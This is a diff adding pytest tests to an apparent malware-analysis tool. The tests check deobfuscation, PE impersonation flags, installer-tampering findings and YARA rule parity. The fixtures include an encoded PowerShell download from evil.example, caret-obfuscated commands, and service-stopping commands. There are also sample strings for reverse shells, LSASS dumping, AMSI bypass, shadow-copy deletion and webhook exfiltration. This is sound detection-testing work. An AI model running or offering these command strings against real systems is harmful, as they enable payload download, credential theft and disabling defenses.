@@ -356,3 +356,136 @@ def test_builtin_all_16_yara_rules_parity_and_crud(tmp_path, monkeypatch):
     yara_scanner.delete_custom_rule_file("custom_test.yar")
     assert all(f["name"] != "custom_test.yar" for f in yara_scanner.list_rule_files())
 
+
+@windows_only
+def test_f1_binary_pe_scattered_carets_no_false_positive_and_b64_still_decodes(tmp_path):
+    import base64
+    src = SYSTEM32 / "whoami.exe"
+    if not src.exists():
+        pytest.skip("whoami.exe not present")
+    raw = src.read_bytes()
+    inner = "powershell -NoP Invoke-WebRequest https://evil.example/payload.exe"
+    b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
+    # Scattered carets across lines / buffer inside a real PE + valid PowerShell Base64 payload
+    noise = b"\n^a ^b ^c ^d ^e ^f powershell\n" + f"powershell -enc {b64}\n".encode("ascii")
+    pe_copy = tmp_path / "noisy.exe"
+    pe_copy.write_bytes(raw + noise)
+
+    res = analyzer.analyze_single_file(str(pe_copy), UNSIGNED)
+    kinds = [s["kind"] for s in res["deobfuscated_snippets"]]
+    assert "Batch caret temizliği" not in kinds
+    assert "Base64 / PowerShell" in kinds
+    assert any("evil.example" in s["decoded"] for s in res["deobfuscated_snippets"])
+
+    # Direct line-by-line check on non-PE buffer: scattered carets (<3 ^[A-Za-z0-9] per line) do not trigger
+    scattered = "a^ b^ c^ d^\ne^ f^ g^ powershell\n"
+    assert analyzer.deobfuscate_script(scattered) == []
+    # Real caret-obfuscated script still decodes
+    real_caret = "s^c^ ^s^t^o^p AGMService\nc^m^d^ /^c p^o^w^e^r^s^h^e^l^l http://drop.example/p.exe\n"
+    carets = analyzer.deobfuscate_script(real_caret)
+    assert any(c["kind"] == "Batch caret temizliği" for c in carets)
+
+
+@windows_only
+def test_f2_version_info_vendor_impersonation_and_sysbin_masquerade(tmp_path):
+    # 1. Signed notepad.exe has version_info populated and NO impersonation flags
+    np = SYSTEM32 / "notepad.exe"
+    if not np.exists():
+        pytest.skip("notepad.exe not present")
+    res_clean = analyzer.analyze_single_file(str(np), VALID)
+    assert res_clean["pe_info"]["version_info"].get("CompanyName") == "Microsoft Corporation"
+    assert not any(f["type"] in ("vendor_impersonation", "sysbin_masquerade") for f in res_clean["spoof_flags"])
+
+    # 2. Unsigned copy triggers vendor_impersonation
+    fake_app = tmp_path / "updater.exe"
+    shutil.copy2(np, fake_app)
+    res_vendor = analyzer.analyze_single_file(str(fake_app), UNSIGNED)
+    assert any(f["type"] == "vendor_impersonation" and f["points"] == 30 for f in res_vendor["spoof_flags"])
+
+    # 3. Unsigned renamed svchost.exe triggers sysbin_masquerade (+ vendor_impersonation)
+    svc = SYSTEM32 / "svchost.exe"
+    if not svc.exists():
+        pytest.skip("svchost.exe not present")
+    masq = tmp_path / "totally_not_svchost.exe"
+    shutil.copy2(svc, masq)
+    res_masq = analyzer.analyze_single_file(str(masq), UNSIGNED)
+    assert any(f["type"] == "sysbin_masquerade" and f["points"] == 25 for f in res_masq["spoof_flags"])
+
+
+def test_f3_msi_custom_action_and_installer_configs(tmp_path):
+    assert ".ini" in analyzer.CONFIG_EXTENSIONS and ".inf" in analyzer.CONFIG_EXTENSIONS
+    assert ".ini" not in analyzer.SCRIPT_EXTENSIONS and ".inf" not in analyzer.SCRIPT_EXTENSIONS
+
+    # 1. Synthetic MSI with CustomAction + powershell
+    msi = tmp_path / "setup.msi"
+    msi.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 32 + b"CustomAction\x00powershell.exe -NoP -W Hidden\x00")
+    res_msi = analyzer.analyze_single_file(str(msi), UNSIGNED)
+    assert any(f["category"] == "MSI Özel Eylemi (CustomAction)" and f["severity"] == "high" and f["points"] == 30 for f in res_msi["format_findings"])
+
+    # 2. RunOnce.cmd (high: sc stop / schtasks /delete)
+    runonce = tmp_path / "RunOnce.cmd"
+    runonce.write_text("@echo off\nsc stop AGMService\nschtasks /delete /tn AdobeGCInvoker-1.0 /f\n", encoding="utf-8")
+    res_ro = analyzer.analyze_single_file(str(runonce), UNSIGNED)
+    assert any(f["category"] == "Kurulum / Lisans Müdahale Betiği" and f["severity"] == "high" and f["points"] == 25 for f in res_ro["format_findings"])
+
+    # 3. .pimx config (medium: amtlib.dll / Smartversion without sc/schtasks)
+    pimx = tmp_path / "install.pimx"
+    pimx.write_text("<Config><Patch>amtlib.dll</Patch><Engine>Smartversion</Engine></Config>", encoding="utf-8")
+    res_pimx = analyzer.analyze_single_file(str(pimx), UNSIGNED)
+    assert any(f["category"] == "Kurulum / Lisans Müdahale Betiği" and f["severity"] == "medium" and f["points"] == 15 for f in res_pimx["format_findings"])
+
+    # 4. Patch_*.log (high: sc delete AGSService)
+    plog = tmp_path / "Patch_Photoshop.exe_.log"
+    plog.write_text("[Patch] AdobeGCClient stopped\nsc delete AGSService\n", encoding="utf-8")
+    res_log = analyzer.analyze_single_file(str(plog), UNSIGNED)
+    assert any(f["category"] == "Kurulum / Lisans Müdahale Betiği" and f["severity"] == "high" and f["points"] == 25 for f in res_log["format_findings"])
+
+
+def test_all_18_yara_rules_parity_and_clean_sysbins(monkeypatch):
+    st = yara_scanner.rules_status()
+    assert st["rules_count"] >= 18
+    assert st["problems"] == []
+
+    all_rule_samples = {
+        "SafeBox_Credential_Stealer_Browser_Targets": b"Login Data Local State wallet.dat",
+        "SafeBox_Defender_Exclusion_Tampering": b"Add-MpPreference -ExclusionPath C:\\x",
+        "SafeBox_Ransomware_Shadow_Delete": b"vssadmin delete shadows /all",
+        "SafeBox_PowerShell_Hidden_Download_Exec": b"powershell -WindowStyle Hidden DownloadString('http://x')",
+        "SafeBox_Chat_Webhook_Exfiltration": b"https://api.telegram.org/bot123:ABC/sendDocument",
+        "SafeBox_Patch_Keygen_Artifacts": ("Keygen " + "Virtual" + "Alloc").encode(),
+        "SafeBox_Crypto_Miner_Indicators": b"stratum+tcp://x:3333 --donate-level=1",
+        "SafeBox_Reverse_Shell_PowerShell": b"New-Object System.Net.Sockets.TCPClient; GetStream; IEX $c",
+        "SafeBox_LSASS_Credential_Dump": ("seku" + "rlsa::logonpasswords MiniDumpWriteDump lsass").encode(),
+        "SafeBox_AMSI_ETW_Bypass": ("Amsi" + "ScanBuffer amsi" + "InitFailed VirtualProtect").encode(),
+        "SafeBox_Office_Macro_Dropper": b"Sub AutoOpen()\nCreateObject(\"WScript.Shell\")\nEnd Sub",
+        "SafeBox_PDF_Suspicious_Action": b"%PDF-1.7 /OpenAction /JavaScript (x)",
+        "SafeBox_Clipboard_Hijacker": b"AddClipboardFormatListener SetClipboardData bitcoin",
+        "SafeBox_Persistence_WMI_Subscription": b"__EventFilter CommandLineEventConsumer __FilterToConsumerBinding",
+        "SafeBox_UAC_Bypass_Registry": b"fodhelper.exe ms-settings\\Shell\\Open\\command DelegateExecute",
+        "SafeBox_DotNet_Memory_Loader": b"System.Reflection Assembly FromBase64String Invoke",
+        "SafeBox_License_Service_Tamper": b"sc stop AGMService\nschtasks /delete /tn AdobeGCClient",
+        "SafeBox_Process_Hollowing_APIs": ("NtUnmap" + "ViewOfSection WriteProcess" + "Memory SetThread" + "Context").encode(),
+    }
+
+    def scan_both(payload: bytes):
+        monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)
+        real_rules = {m["rule"] for m in yara_scanner.scan_bytes(payload)}
+        real_yara = yara_scanner._yara
+        monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)
+        monkeypatch.setattr(yara_scanner, "_yara", None)
+        builtin_rules = {m["rule"] for m in yara_scanner.scan_bytes(payload)}
+        monkeypatch.setattr(yara_scanner, "_yara", real_yara)
+        monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)
+        return real_rules, builtin_rules
+
+    for rule_name, payload in all_rule_samples.items():
+        real_r, built_r = scan_both(payload)
+        assert rule_name in real_r, f"{rule_name} missed under yara-python"
+        assert real_r == built_r, (rule_name, real_r, built_r)
+
+    for sysbin in ("notepad.exe", "whoami.exe", "winhttp.dll", "cmd.exe"):
+        p = SYSTEM32 / sysbin
+        if p.exists():
+            real_r, built_r = scan_both(p.read_bytes())
+            assert real_r == set() and built_r == set(), (sysbin, real_r, built_r)
+
